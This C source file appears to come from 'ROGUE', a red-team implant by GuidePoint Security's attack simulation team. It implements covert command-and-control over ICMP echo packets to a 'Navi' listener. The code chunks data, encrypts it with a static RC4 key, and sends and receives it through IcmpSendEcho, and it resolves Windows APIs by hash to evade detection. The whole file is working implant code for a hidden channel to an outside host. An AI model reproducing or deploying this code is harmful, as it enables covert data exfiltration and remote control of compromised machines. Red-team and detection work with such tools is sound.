/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;
} RC4_PARAM, *PRC4_PARAM ;

NTSTATUS
NTAPI
SystemFunction032(
	_In_ PRC4_PARAM Buffer,
	_In_ PRC4_PARAM Key
);

typedef struct __attribute__(( packed, scalar_storage_order( "big-endian" ) ))
{
	/* Unencrypted */
	UINT16	Signature;

	/* Encrypted */
	UINT16	ChunkNumber;
	UINT16	ChunkTotal;
	UINT16	Id;
	UINT8	Buffer[0];
} ICMP_BUF_HEADER, *PICMP_BUF_HEADER ;

typedef struct
{
	D_API( RtlIpv4StringToAddressA );
	D_API( LdrGetProcedureAddress );
	D_API( RtlInitUnicodeString );
	D_API( RtlInitAnsiString );
	D_API( SystemFunction032 );
	D_API( RtlReAllocateHeap );
	D_API( IcmpCloseHandle );
	D_API( RtlAllocateHeap );
	D_API( IcmpCreateFile );
	D_API( IcmpSendEcho );
	D_API( LdrUnloadDll );
	D_API( RtlFreeHeap );
	D_API( LdrLoadDll );
} API ;

/* API Hashes */
#define H_API_RTLIPV4STRINGTOADDRESSA	0xb3d0cd9b /* RtlIpv4StringtoAddressA */	
#define H_API_LDRGETPROCEDUREADDRESS	0xfce76bb6 /* LdrGetProcedureAddress */
#define H_API_RTLINITUNICODESTRING	0xef52b589 /* RtlInitUnicodeString */
#define H_API_RTLINITANSISTRING		0xa0c8436d /* RtlInitAnsiString */
#define H_API_RTLREALLOCATEHEAP		0xaf740371 /* RtlReAllocateHeap */
#define H_API_ICMPCLOSEHANDLE		0xe844feb0 /* IcmpCloseHandle */
#define H_API_RTLALLOCATEHEAP		0x3be94c5a /* RtlAllocateHeap */
#define H_API_ICMPCREATEFILE		0x7ea32e42 /* IcmpCreateFile */
#define H_API_ICMPSENDECHO		0xe70f1177 /* IcmpSendEcho */
#define H_API_LDRUNLOADDLL		0xd995c1e6 /* LdrUnloadDll */
#define H_API_RTLFREEHEAP		0x73a9e4d7 /* RtlFreeHeap */
#define H_API_LDRLOADDLL		0x9e456a43 /* LdrLoadDll */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */			

/*!
 *
 * Purpose:
 *
 * Sends a buffer over ICMP to the Navi listener.
 *
!*/
D_SEC( B ) BOOL IcmpSend( _In_ PCHAR HostName, _In_ PROGUE_CTX Context, _In_ PVOID Buffer, _In_ ULONG Length )
{
	API			Api;
	IN_ADDR			Ip4;
	RC4_PARAM		Buf;
	RC4_PARAM		Key;
	ANSI_STRING		Ani;
	UNICODE_STRING		Uni;

	BOOL			Ret = FALSE;
	ULONG			Len = 0;
	USHORT			Uid = 0;
	USHORT			Num = 0;
	USHORT			Min = 0;
	USHORT			Max = 0;

	PVOID			Icm = NULL;
	PVOID			Adv = NULL;
	PVOID			Msg = NULL;
	PUINT8			Tem = NULL;
	HANDLE			Fil = NULL;
	PBUFFER			Inb = NULL;
	PBUFFER			Out = NULL;
	PICMP_ECHO_REPLY	Rep = NULL;
	PICMP_BUF_HEADER	Hdr = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ip4, sizeof( Ip4 ) );
	RtlSecureZeroMemory( &Buf, sizeof( Buf ) );
	RtlSecureZeroMemory( &Key, sizeof( Key ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	Api.RtlIpv4StringToAddressA = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLIPV4STRINGTOADDRESSA );
	Api.LdrGetProcedureAddress  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRGETPROCEDUREADDRESS );
	Api.RtlInitUnicodeString    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING );
	Api.RtlInitAnsiString       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITANSISTRING );
	Api.RtlReAllocateHeap       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREALLOCATEHEAP );
	Api.RtlAllocateHeap         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.LdrUnloadDll            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
	Api.RtlFreeHeap             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api.LdrLoadDll              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );

	/* Set the static key value */
	Key.Length = Key.MaximumLength = KEY_LENGTH;
	Key.Buffer = C_PTR( G_PTR( KEY ) ); 

	/* Load advapi32.dll to locate our cryptographic functions note: custom ARC4 */
	Api.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"advapi32.dll" ) ) );

	if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Uni, &Adv ) ) ) {

		/* Load iphlpapi.dll to call ICMP functions note: ( use NTAPI ) */
		Api.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"iphlpapi.dll" ) ) );

		if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Uni, &Icm ) ) ) {

			/* Acquire the cryptographic function */
			Api.RtlInitAnsiString( &Ani, C_PTR( G_PTR( "SystemFunction032" ) ) );

			if ( NT_SUCCESS( Api.LdrGetProcedureAddress( Adv, &Ani, 0, &Api.SystemFunction032 ) ) ) {
				/* Find the rest of the ICMP API */
				Api.IcmpCloseHandle = PeGetFuncEat( Icm, H_API_ICMPCLOSEHANDLE );
				Api.IcmpCreateFile  = PeGetFuncEat( Icm, H_API_ICMPCREATEFILE );
				Api.IcmpSendEcho    = PeGetFuncEat( Icm, H_API_ICMPSENDECHO );

				if ( ( Fil = Api.IcmpCreateFile() ) != INVALID_HANDLE_VALUE ) {

					/* Total number of chunks needed */
					Max = Length / ICMP_CHUNK_SIZE + ( ( Length % ICMP_CHUNK_SIZE ) > 0 ? 1 : 0 );

					/* Initial */
					Num = 1;
					Len = Length;
					Msg = C_PTR( Buffer );
					Uid = RandomInt16();

					/* Sending the chunks! */
					do 
					{
						Min = min( ICMP_CHUNK_SIZE, Len );

						/* Construct the output buffer! */
						if ( ( Out = BufferCreate() ) != NULL ) {
							/* Create the header for the packet */
							if ( BufferExtend( Out, sizeof( ICMP_BUF_HEADER ) ) ) {
								Hdr = C_PTR( Out->Buffer );
								Hdr->Id          = Uid;
								Hdr->Signature   = 0xFEFE;
								Hdr->ChunkTotal  = Max;
								Hdr->ChunkNumber = Num;

								/* Add our respeective buffer */
								if ( BufferAddRaw( Out, Msg, Min ) ) {
									Buf.Length = Buf.MaximumLength = Out->Length - sizeof( UINT16 );
									Buf.Buffer = C_PTR( U_PTR( Out->Buffer ) + sizeof( UINT16 ) );

									/* Encrypt the sending buffer! */
									if ( NT_SUCCESS( Api.SystemFunction032( &Buf, &Key ) ) ) {
										/* Create the IPv4 address structure we can use */
										if ( NT_SUCCESS( Api.RtlIpv4StringToAddressA( HostName, TRUE, &Tem, &Ip4 ) ) ) {
											/* Create the recieve buffer */
											if ( ( Inb = BufferCreate() ) != NULL ) {
												/* Get the complete size of the packet */
												if ( BufferExtend( Inb, ICMP_CHUNK_SIZE + 1024 ) ) {
													/* Send the complete buffer over! */
													if ( Api.IcmpSendEcho( Fil, Ip4.s_addr, Out->Buffer, Out->Length, NULL, Inb->Buffer, Inb->Length, ICMP_WAIT_TIMEOUT ) ) {
														Rep = C_PTR( Inb->Buffer );

														if ( Rep->DataSize < sizeof( ICMP_BUF_HEADER ) ) {
															break;
														};

														Hdr = C_PTR( Rep->Data );

														if ( Hdr->Signature != 0xFFFF ) {
															break;
														};

														/* We need to decrypt the data portion of the packet */
														Buf.Buffer = C_PTR( U_PTR( Rep->Data ) + sizeof( UINT16 ) );
														Buf.Length = Buf.MaximumLength = Rep->DataSize - sizeof( UINT16 );

														if ( NT_SUCCESS( Api.SystemFunction032( &Buf, &Key ) ) ) {
															/* Next packet? */
															if ( Num != Max && Hdr->Id != Uid ) {
																break;
															};
															/* Last packet and not matching? */
															if ( Num == Max && Hdr->Id != Uid ) {
																/* All chunks sent!: STATUS */
																Ret = TRUE;
															};

															/* Decrement the size and packet offset */
															Len = Len - Min;
															Msg = C_PTR( U_PTR( Msg ) + Min );
															
															/* Increment chunk count */
															Num = Num + 1;
														} else {
															break;
														};
													} else {
														break;
													};
												} else {
													break;
												};
												Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Inb->Buffer );
												Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Inb );
												Inb = NULL;
											} else {
												break;
											};
										} else {
											break;
										};
									} else {
										break;
									};
								} else {
									break;
								};
							} else {
								break;
							};
							Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out->Buffer );
							Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out );
							Out = NULL;
						} else {
							break;
						};
					} while ( Len != 0 );

					if ( Out != NULL ) {
						Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out->Buffer );
						Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out );
						Out = NULL;
					};
					if ( Inb != NULL ) {
						Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Inb->Buffer );
						Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Inb );
						Inb = NULL;
					};

					/* Close the respective handle */
					Api.IcmpCloseHandle( Fil );
				};
			};

			/* Free iphlpapi.dll */
			Api.LdrUnloadDll( Icm );
		};

		/* Free advapi32.dll */
		Api.LdrUnloadDll( Adv );
	};

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ip4, sizeof( Ip4 ) );
	RtlSecureZeroMemory( &Buf, sizeof( Buf ) );
	RtlSecureZeroMemory( &Key, sizeof( Key ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	/* Return */
	return Ret;
};

/*!
 *
 * Purpose:
 *
 * Recieves a buffer over ICMP from Navi.
 *
!*/
D_SEC( B ) BOOL IcmpRecv( _In_ PCHAR HostName, _In_ PROGUE_CTX Context, _In_ PVOID* Buffer, _In_ ULONG* Length )
{
	API			Api;
	IN_ADDR			Ip4;
	RC4_PARAM		Buf;
	RC4_PARAM		Key;
	ANSI_STRING		Ani;
	UNICODE_STRING		Uni;

	BOOL			Ret = FALSE;
	USHORT			Uid = 0;
	USHORT			Max = 0;

	PVOID			Tem = NULL;
	PVOID			Adv = NULL;
	PVOID			Icm = NULL;
	PVOID			Tmp = NULL;
	HANDLE			Fil = NULL;
	PBUFFER			Out = NULL;
	PBUFFER			Inb = NULL;
	PICMP_ECHO_REPLY	Rep = NULL;
	PICMP_BUF_HEADER	Hdr = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ip4, sizeof( Ip4 ) );
	RtlSecureZeroMemory( &Buf, sizeof( Buf ) );
	RtlSecureZeroMemory( &Key, sizeof( Key ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	Api.RtlIpv4StringToAddressA = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLIPV4STRINGTOADDRESSA );
	Api.LdrGetProcedureAddress  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRGETPROCEDUREADDRESS );
	Api.RtlInitUnicodeString    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING );
	Api.RtlInitAnsiString       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITANSISTRING );
	Api.RtlReAllocateHeap       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREALLOCATEHEAP );
	Api.RtlAllocateHeap         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.LdrUnloadDll            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
	Api.RtlFreeHeap             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api.LdrLoadDll              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );

	/* Sset the static key value */
	Key.Length = Key.MaximumLength = KEY_LENGTH;
	Key.Buffer = C_PTR( G_PTR( KEY ) );

	/* Load advapi32.dll: Note, create our own version of ARC4 */
	Api.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"advapi32.dll" ) ) );

	if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Uni, &Adv ) ) ) {

		/* Load iphlpapi.dll to call ICMP functions note: ( use NTAPI ) */
		Api.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"iphlpapi.dll" ) ) );

		if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Uni, &Icm ) ) ) {

			/* Acquire the crytographic function */
			Api.RtlInitAnsiString( &Ani, C_PTR( G_PTR( "SystemFunction032" ) ) );

			if ( NT_SUCCESS( Api.LdrGetProcedureAddress( Adv, &Ani, 0, &Api.SystemFunction032 ) ) ) {

				Api.IcmpCloseHandle = PeGetFuncEat( Icm, H_API_ICMPCLOSEHANDLE );
				Api.IcmpCreateFile  = PeGetFuncEat( Icm, H_API_ICMPCREATEFILE );
				Api.IcmpSendEcho    = PeGetFuncEat( Icm, H_API_ICMPSENDECHO );

				if ( ( Fil = Api.IcmpCreateFile() ) != INVALID_HANDLE_VALUE ) {
					if ( ( Out = BufferCreate() ) != NULL ) {
						if ( BufferExtend( Out, sizeof( ICMP_BUF_HEADER ) ) ) {

							Hdr = C_PTR( Out->Buffer );
							Hdr->Id          = RandomInt16();
							Hdr->Signature   = 0xFEFE;
							Hdr->ChunkTotal  = 1;
							Hdr->ChunkNumber = 1;

							if ( BufferAddRaw( Out, Context->Id, sizeof( Context->Id ) ) ) {

								Buf.Length = Buf.MaximumLength = Out->Length - sizeof( UINT16 );
								Buf.Buffer = C_PTR( U_PTR( Out->Buffer ) + sizeof( UINT16 ) );

								if ( NT_SUCCESS( Api.SystemFunction032( &Buf, &Key ) ) ) {
									if ( NT_SUCCESS( Api.RtlIpv4StringToAddressA( HostName, TRUE, &Tem, &Ip4 ) ) ) { 
										if ( ( Inb = BufferCreate() ) != NULL ) {
											if ( BufferExtend( Inb, ICMP_CHUNK_SIZE + 1024 ) ) {
												if ( Api.IcmpSendEcho( Fil, Ip4.s_addr, Out->Buffer, Out->Length, NULL, Inb->Buffer, Inb->Length, ICMP_WAIT_TIMEOUT ) ) {
													Rep = C_PTR( Inb->Buffer );

													if ( Rep->DataSize < sizeof( ICMP_BUF_HEADER ) ) {
														goto Leave;
													};

													Hdr = C_PTR( Rep->Data );

													if ( Hdr->Signature != 0xFFFF ) {
														goto Leave;
													};

													Buf.Buffer = C_PTR( U_PTR( Rep->Data ) + sizeof( UINT16 ) );
													Buf.Length = Buf.MaximumLength = Rep->DataSize - sizeof( UINT16 );

													if ( NT_SUCCESS( Api.SystemFunction032( &Buf, &Key ) ) ) {
														/* Create a buffer to hold our reply! */
														if ( ( *Buffer = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Rep->DataSize - sizeof( ICMP_BUF_HEADER ) ) ) != NULL ) {
															/* Information about the next potential chunk! */
															Max = Hdr->ChunkTotal;
															Uid = Hdr->Id;

															/* Set the length */
															*Length = Rep->DataSize - sizeof( ICMP_BUF_HEADER );

															/* Copy over the buffer */
															__builtin_memcpy( *Buffer, Hdr->Buffer, Rep->DataSize - sizeof( ICMP_BUF_HEADER ) );
														};
														/* Status */
														Ret = Hdr->ChunkTotal > 1 ? FALSE : TRUE;
													};
												};
											};
											Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Inb->Buffer );
											Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Inb );
											Inb = NULL;
										};
									};
								};
							};
						};
Leave:
						Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out->Buffer );
						Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out );
						Out = NULL;
					};
					/* Need more chunks? */
					if ( Max > 1 ) {
						if ( ( Out = BufferCreate() ) ) {
							if ( BufferExtend( Out, sizeof( ICMP_BUF_HEADER ) ) ) {
								Hdr = C_PTR( Out->Buffer );
								Hdr->Signature   = 0xFEFE;
								Hdr->Id          = Uid;
								Hdr->ChunkTotal  = 0;
								Hdr->ChunkNumber = 0;

								if ( BufferAddRaw( Out, Context->Id, sizeof( Context->Id ) ) ) {
									Buf.Buffer = C_PTR( U_PTR( Out->Buffer ) + sizeof( UINT16 ) );
									Buf.Length = Buf.MaximumLength = Out->Length - sizeof( UINT16 );

									if ( NT_SUCCESS( Api.SystemFunction032( &Buf, &Key ) ) ) {
										if ( NT_SUCCESS( Api.RtlIpv4StringToAddressA( HostName, TRUE, &Tem, &Ip4 ) ) ) {

											/* Start requesting the rest of the chunks */
											for ( USHORT Idx = 1 ; Idx != Max ; ++Idx ) 
											{ 
												/* Create the input buffer */
												if ( ( Inb = BufferCreate() ) ) {
													/* Extend to hold a reply */
													if ( BufferExtend( Inb, ICMP_CHUNK_SIZE + 1024 ) ) {
														/* Send the request and hold the response */
														if ( Api.IcmpSendEcho( Fil, Ip4.s_addr, Out->Buffer, Out->Length, NULL, Inb->Buffer, Inb->Length, ICMP_WAIT_TIMEOUT ) ) {
															Rep = C_PTR( Inb->Buffer );
															
															if ( Rep->DataSize < sizeof( ICMP_BUF_HEADER ) ) {
																break;
															};

															Hdr = C_PTR( Rep->Data );

															if ( Hdr->Signature != 0xFFFF ) {
																break;
															};

															Buf.Buffer = C_PTR( U_PTR( Rep->Data ) + sizeof( UINT16 ) );
															Buf.Length = Buf.MaximumLength = Rep->DataSize - sizeof( UINT16 );

															if ( NT_SUCCESS( Api.SystemFunction032( &Buf, &Key ) ) ) 
															{
																if ( ( Idx + 1 ) != Max && Hdr->Id != Uid ) {
																	break;
																};
																if ( ( Tmp = Api.RtlReAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, *Buffer, *Length + Rep->DataSize - sizeof( ICMP_BUF_HEADER ) ) ) != NULL ) {
																	/* Set new buffer pointer */
																	*Buffer = C_PTR( Tmp );

																	/* Copy over new buffer */
																	__builtin_memcpy( C_PTR( U_PTR( *Buffer ) + *Length ), Hdr->Buffer, Rep->DataSize - sizeof( ICMP_BUF_HEADER ) );

																	/* Set new length */
																	*Length = *Length + Rep->DataSize - sizeof( ICMP_BUF_HEADER );

																	/* Is our last? */
																	Ret = ( Idx + 1 ) != Max ? FALSE : TRUE;
																};
															} else {
																break;
															};
														} 
														else 
														{
															break;
														};
													} else {
														break;
													};
													Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Inb->Buffer );
													Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Inb );
													Inb = NULL;
												} else {
													break;
												};
											};

											if ( Inb != NULL ) {
												Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Inb->Buffer );
												Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Inb );
												Inb = NULL;
											};
										};
									};
								};
							};
							Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out->Buffer );
							Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out );
							Out = NULL;
						};
					};
					Api.IcmpCloseHandle( Fil );
				};
			};

			/* Dereference */
			Api.LdrUnloadDll( Icm );
		};
		/* Dereference */
		Api.LdrUnloadDll( Adv );
	};

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ip4, sizeof( Ip4 ) );
	RtlSecureZeroMemory( &Buf, sizeof( Buf ) );
	RtlSecureZeroMemory( &Key, sizeof( Key ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	/* Status */
	return Ret;
};
